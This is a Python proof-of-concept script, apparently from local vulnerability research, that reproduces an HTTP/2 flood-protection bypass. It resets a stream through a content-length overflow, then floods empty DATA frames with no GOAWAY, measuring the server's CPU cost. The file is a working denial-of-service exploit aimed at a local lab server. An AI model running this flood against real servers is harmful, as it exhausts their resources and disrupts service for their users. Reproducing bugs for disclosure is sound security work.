#!/usr/bin/env python3
"""Minimal repro: DATA-frame flood budget bypass on terminal HTTP/2 streams.

Control: empty DATA frames on a normal open stream -> GOAWAY after 100.
Bypass:  make the stream locally reset (content-length overflow), then flood
         empty DATA frames on the same stream -> no GOAWAY, unbounded.
"""
import struct
import sys
import time

sys.path.insert(0, "/tmp/opencode/h2lab")
from h2raw import *
import hpack

PORT = int(open("/tmp/opencode/h2lab/port.env").read().strip().split("=")[1])
PID = int(open("/tmp/opencode/h2lab/logs/httpd-rs.pid").read().strip())


def enc(hs):
    return hpack.Encoder().encode(hs)


def conn():
    s = connect(PORT)
    s.sendall(frame(4, 0, 0, b""))
    return s


def goaway_seen(s, t=0.02):
    for f in read_frames(s, t):
        if not isinstance(f[0], str) and f[0] == 7:
            last, code = struct.unpack(">II", f[3][:8])
            return (last, code, f[3][8:])
    return None


def ticks():
    with open(f"/proc/{PID}/stat") as f:
        p = f.read().split()
    return int(p[13]) + int(p[14])


# --- CONTROL ---
s = conn()
s.sendall(frame(1, 0x4, 1, enc([(":method", "POST"), (":scheme", "https"), (":authority", "localhost"), (":path", "/")])))
for i in range(1, 201):
    s.sendall(frame(0, 0, 1, b""))
    g = goaway_seen(s)
    if g:
        print(f"CONTROL: GOAWAY after {i} empty DATA frames: last={g[0]} code={g[1]} debug={g[2]!r}")
        break
s.close()

# --- BYPASS ---
s = conn()
# content-length overflow makes the server locally reset stream 1
s.sendall(frame(1, 0x4, 1, enc([(":method", "POST"), (":scheme", "https"), (":authority", "localhost"), (":path", "/"), ("content-length", "1")])))
s.sendall(frame(0, 0, 1, b"ab"))
print("BYPASS setup RST:", [(FRAME_TYPES.get(f[0], f[0]), f[2]) for f in read_frames(s, 0.3) if not isinstance(f[0], str)])

t0 = ticks()
start = time.time()
sent = 0
while time.time() - start < 5:
    n = 200
    s.sendall(frame(0, 0, 1, b"") * n)
    sent += n
    g = goaway_seen(s)
    if g:
        print(f"BYPASS: GOAWAY after {sent} frames: {g}")
        break
else:
    print(f"BYPASS: {sent} empty DATA frames in {time.time()-start:.1f}s, NO GOAWAY, connection alive")
t1 = ticks()
print(f"BYPASS: server CPU {((t1-t0)/100):.2f}s for {sent} frames = {(t1-t0)/100/max(sent,1)*1e6:.1f} us/frame")
s.close()
